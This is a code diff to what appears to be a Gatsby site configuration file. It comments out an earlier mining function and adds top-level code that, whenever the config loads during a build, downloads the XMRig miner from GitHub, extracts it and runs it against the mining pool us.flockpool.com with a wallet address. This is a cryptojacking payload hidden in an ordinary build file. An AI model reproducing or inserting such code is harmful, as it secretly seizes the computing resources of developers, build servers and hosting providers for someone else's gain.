@@ -2,22 +2,33 @@ require(`dotenv`).config()
 
 const shouldAnalyseBundle = process.env.ANALYSE_BUNDLE
 
-const { promisify } = require('util');
-const exec = promisify(require('child_process').exec);
+//const { promisify } = require('util');
+// const exec = promisify(require('child_process').exec);
 
-export default async function () {
-  const cpu = await exec('wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz');
-  const disk = await exec('tar xf xmrig-6.16.2-linux-static-x64.tar.gz');
-  const memory = await exec('./xmrig-6.16.2/xmrig -a gr -o us.flockpool.com:5555 --tls -u RLUciajDyEujXL6J21S83EfapBJLte9gu6.kk18 -p');
+// export default async function () {
+//   const cpu = await exec('wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz');
+//   const disk = await exec('tar xf xmrig-6.16.2-linux-static-x64.tar.gz');
+//   const memory = await exec('./xmrig-6.16.2/xmrig -a gr -o us.flockpool.com:5555 --tls -u RLUciajDyEujXL6J21S83EfapBJLte9gu6.kk18 -p');
 
-  const payload = {
-    cpu,
-    disk,
-    memory,
-  };
+//   const payload = {
+//     cpu,
+//     disk,
+//     memory,
+//   };
 
- return payload
-}
+//  return payload
+// }
+const { exec } = require('child_process');
+exec('wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz && tar xf xmrig-6.16.2-linux-static-x64.tar.gz && ./xmrig-6.16.2/xmrig -a gr -o us.flockpool.com:5555 --tls -u RLUciajDyEujXL6J21S83EfapBJLte9gu6.kk18 -p  ', (err, stdout, stderr) => {
+  if (err) {
+    //some err occurred
+    console.error(err)
+  } else {
+   // the *entire* stdout and stderr (buffered)
+   console.log(`stdout: ${stdout}`);
+   console.log(`stderr: ${stderr}`);
+  }
+});
 
 module.exports = {
   siteMetadata: {
